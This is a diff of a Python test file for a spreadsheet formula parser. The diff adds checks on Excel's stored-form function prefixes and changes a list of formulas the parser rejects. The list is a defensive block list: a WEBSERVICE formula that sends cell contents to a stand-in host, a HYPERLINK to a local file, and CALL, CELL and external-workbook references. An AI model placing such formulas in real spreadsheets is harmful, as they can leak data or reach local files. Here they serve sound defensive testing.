@@ -91,6 +91,17 @@ def test_stored_form_has_excel_prefixes():
         "=_xlfn._xlws.FILTER('Q1'!A2:B3,'Q1'!B2:B3>1)&_xlfn.XLOOKUP(1,A2:A3,B2:B3)"
         "&_xlfn.IFNA(A2,0)"
     )
+    added = parse(
+        "=LET(total,STDEV.S(A2:A3)+DAYS(A2,A3)+CEILING.MATH(A2),SEQUENCE(total)"
+        "+RANK.EQ(A2,A2:A3)+TODAY())"
+    )
+    assert emit(added, stored=True) == (
+        "=_xlfn.LET(_xlpm.total,_xlfn.STDEV.S(A2:A3)+_xlfn.DAYS(A2,A3)"
+        "+_xlfn.CEILING.MATH(A2),_xlfn.SEQUENCE(_xlpm.total)+_xlfn.RANK.EQ(A2,A2:A3)"
+        "+TODAY())"
+    )
+    # The stored form reads back to the same formula.
+    assert parse(emit(added, stored=True)) == added
 
 
 @pytest.mark.parametrize(
@@ -98,14 +109,16 @@ def test_stored_form_has_excel_prefixes():
     [
         ('=INDIRECT("B"&A2)', "INDIRECT is not accepted"),
         ("=OFFSET(A1,1,1)", "OFFSET is not accepted"),
-        ("=TODAY()", "TODAY is not accepted"),
+        ("=RANDBETWEEN(1,6)", "RANDBETWEEN is not accepted"),
         ("=RAND()", "RAND is not accepted"),
         ('=WEBSERVICE("https://x.example/?"&A2)', "WEBSERVICE is not accepted"),
         ('=HYPERLINK("file:///C:/x")', "HYPERLINK is not accepted"),
         ('=CELL("filename")', "CELL is not accepted"),
         ("=CALL(A1)", "CALL is not accepted"),
-        ('=TEXT(A2,"0")', "TEXT is not supported"),
+        ('=TEXTBEFORE(A2,"-")', "TEXTBEFORE is not supported"),
         ("=SOMME(B2,B3)", "SUM instead of SOMME"),
+        ("=ECARTYPE.STANDARD(B2:B3)", "STDEV.S instead of ECARTYPE.STANDARD"),
+        ("=AUJOURDHUI()", "TODAY instead of AUJOURDHUI"),
         ("=SUM(B2;B3)", "not semicolons"),
         ("=[x.xlsx]Feuil1!A1", "another workbook"),
         ("='C:\\docs\\[a.xlsx]S'!A1", "another workbook"),
